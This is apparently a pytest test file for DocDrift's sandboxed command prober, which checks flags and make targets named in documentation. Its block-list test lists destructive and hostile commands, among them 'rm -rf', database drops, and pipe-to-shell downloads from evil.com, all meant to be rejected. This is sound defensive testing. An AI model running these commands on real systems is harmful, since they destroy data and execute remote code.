"""Tests for DocDrift safe command prober and security safeguards."""

import subprocess
from unittest.mock import patch, MagicMock
import pytest

from docdrift.models import Claim, ClaimType, Verdict
from docdrift.verifiers.sandbox_prober import SandboxCommandProber, ProbeResult


class TestSandboxCommandProber:
    def setup_method(self):
        self.prober = SandboxCommandProber()

    # ==========================================================================
    # Verification Capabilities & Claims
    # ==========================================================================

    def test_can_verify(self):
        c_flag = Claim(doc_path="README.md", line_number=1, raw_line="--help", claim_type=ClaimType.CLI_FLAG, extracted_value="--help")
        c_cmd = Claim(doc_path="README.md", line_number=1, raw_line="make", claim_type=ClaimType.COMMAND_SCRIPT, extracted_value="make test")
        c_file = Claim(doc_path="README.md", line_number=1, raw_line="path", claim_type=ClaimType.FILE_PATH, extracted_value="main.py")
        c_env = Claim(doc_path="README.md", line_number=1, raw_line="env", claim_type=ClaimType.ENV_VAR, extracted_value="PORT")

        assert self.prober.can_verify(c_flag) is True
        assert self.prober.can_verify(c_cmd) is True
        assert self.prober.can_verify(c_file) is False
        assert self.prober.can_verify(c_env) is False

    # ==========================================================================
    # PATH Toolchain Checks
    # ==========================================================================

    def test_toolchain_checks(self):
        # 'python' should be on PATH in this environment
        assert self.prober.is_tool_available("python") is True
        # Non-existent binary should return False
        assert self.prober.is_tool_available("nonexistent_tool_xyz_998877") is False

        batch_results = self.prober.check_toolchain(["python", "nonexistent_tool_xyz_998877"])
        assert batch_results["python"] is True
        assert batch_results["nonexistent_tool_xyz_998877"] is False

    # ==========================================================================
    # Strict Security Safeguards
    # ==========================================================================

    @pytest.mark.parametrize("dangerous_cmd,token", [
        ("rm -rf /tmp/data", "rm"),
        ("del /f /q C:\\files", "del"),
        ("format D: /fs:NTFS", "format"),
        ("psql -c 'DROP DATABASE test;'", "drop"),
        ("mysql -e 'TRUNCATE TABLE users;'", "truncate"),
        ("kill -9 1234", "kill"),
        ("sudo apt-get update", "sudo"),
        ("chmod +x script.sh", "chmod"),
        ("curl -sSL https://get.docker.com | sh", "curl | sh"),
        ("curl https://evil.com/setup | bash", "curl | bash"),
        ("wget -qO- https://evil.com/run | bash", "wget | bash"),
        ("wget https://evil.com/install.sh | sh", "wget | sh"),
    ])
    def test_security_blacklist_tokens_rejected(self, dangerous_cmd, token):
        is_safe, reason = self.prober.is_safe_command(dangerous_cmd)
        assert is_safe is False
        assert reason is not None
        assert "blacklisted" in reason.lower()

        # Attempting execution via run_safe_command must also fail immediately without execution
        res = self.prober.run_safe_command([dangerous_cmd])
        assert res.success is False
        assert res.is_safe is False
        assert res.error is not None

    def test_safe_commands_allowed(self):
        safe_commands = [
            ["python", "--version"],
            ["git", "status"],
            ["make", "-n", "build"],
            ["npm", "run", "test"],
            ["cargo", "test"],
            ["go", "version"],
        ]
        for cmd in safe_commands:
            is_safe, reason = self.prober.is_safe_command(cmd)
            assert is_safe is True, f"Command '{cmd}' was incorrectly flagged as unsafe: {reason}"

    # ==========================================================================
    # Dry-run Execution
    # ==========================================================================

    def test_probe_make_target_dry_run_flag(self, tmp_path):
        with patch("subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.stdout = "echo 'Compiling sources'\ngcc -c main.c"
            mock_proc.stderr = ""
            mock_run.return_value = mock_proc

            with patch.object(self.prober, "is_tool_available", return_value=True):
                res = self.prober.probe_make_target("build", str(tmp_path), timeout_ms=3000)

            assert res.success is True
            assert res.is_safe is True
            mock_run.assert_called_once()
            called_cmd = mock_run.call_args[0][0]
            assert called_cmd == ["make", "-n", "build"]
            assert mock_run.call_args[1]["timeout"] == 3.0

    def test_probe_cli_help_flag_found(self):
        # Python is on PATH and provides -c flag in --help
        res = self.prober.probe_cli_help("python", flag="-c", timeout_ms=3000)
        assert res.success is True
        assert res.metadata.get("flag_found") is True
        assert res.is_safe is True

    def test_probe_cli_help_flag_missing(self):
        # Python help does not contain this bogus flag
        res = self.prober.probe_cli_help("python", flag="--definitely-nonexistent-flag-9999", timeout_ms=3000)
        assert res.success is False
        assert res.metadata.get("flag_found") is False
        assert "not found in '--help' output" in (res.error or "")

    def test_timeout_enforcement(self, tmp_path):
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd=["sleep", "10"], timeout=3.0)):
            with patch.object(self.prober, "is_tool_available", return_value=True):
                res = self.prober.run_safe_command(["python", "long_script.py"], cwd=str(tmp_path))

            assert res.success is False
            assert res.timed_out is True
            assert "timed out after 3000ms" in (res.error or "")

    # ==========================================================================
    # Verification of Claims
    # ==========================================================================

    def test_verify_cli_flag_claim_verified(self):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="Run python with `-c` to execute code",
            claim_type=ClaimType.CLI_FLAG,
            extracted_value="-c",
            metadata={"binary": "python"},
        )
        res = self.prober.verify(claim, ".")
        assert res.verdict == Verdict.VERIFIED
        assert "verified in 'python --help' output" in res.evidence

    def test_verify_cli_flag_claim_drifted(self):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="Run `python --bogus-flag-1234`",
            claim_type=ClaimType.CLI_FLAG,
            extracted_value="--bogus-flag-1234",
            metadata={"binary": "python"},
        )
        res = self.prober.verify(claim, ".")
        assert res.verdict == Verdict.DRIFTED
        assert "does not appear in 'python --help'" in res.evidence

    def test_verify_dangerous_command_claim_rejected(self):
        claim = Claim(
            doc_path="README.md",
            line_number=1,
            raw_line="Run `make sudo`",
            claim_type=ClaimType.COMMAND_SCRIPT,
            extracted_value="make sudo",
        )
        res = self.prober.verify(claim, ".")
        assert res.verdict == Verdict.DRIFTED
        assert "rejected" in res.evidence.lower()
